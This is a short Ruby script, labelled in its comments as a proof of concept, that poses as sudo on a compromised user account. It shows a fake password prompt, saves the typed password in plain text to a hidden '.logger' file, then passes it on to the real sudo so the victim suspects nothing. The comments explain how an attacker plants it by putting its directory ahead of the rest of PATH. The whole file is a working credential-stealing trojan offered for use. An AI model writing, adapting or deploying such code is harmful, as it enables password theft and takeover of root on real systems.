#!/usr/bin/env ruby
# http://HISPAGATOS.org  http://binaryfreedom.info
# probe of comcept to capture user password.
# when attacker compromise a regular use shell account, he can
# jump into root or steal user password by adding into the user enviroment
# the path where this sudo script sits example PATH=/theplace:$PATH  etc notice that is BEFORE
# the rest of the path entries so any program in this path will run BEFORE the real program.
# cfernandez@hispagatos.org  http://hispagatos.org


require 'io/console'

def promp()
 username = ENV['LOGNAME']
 STDOUT.flush
 print "[sudo] password for #{username}: " 
 p = STDIN.noecho(&:gets).chomp
end

ARGUMENTS = ARGV.join(' ')
paso = promp()
File.open('.logger', 'w') do |you|
 you.puts(paso)
end 

cmd = "echo '#{paso}' | sudo -kS "+ARGUMENTS
exec cmd
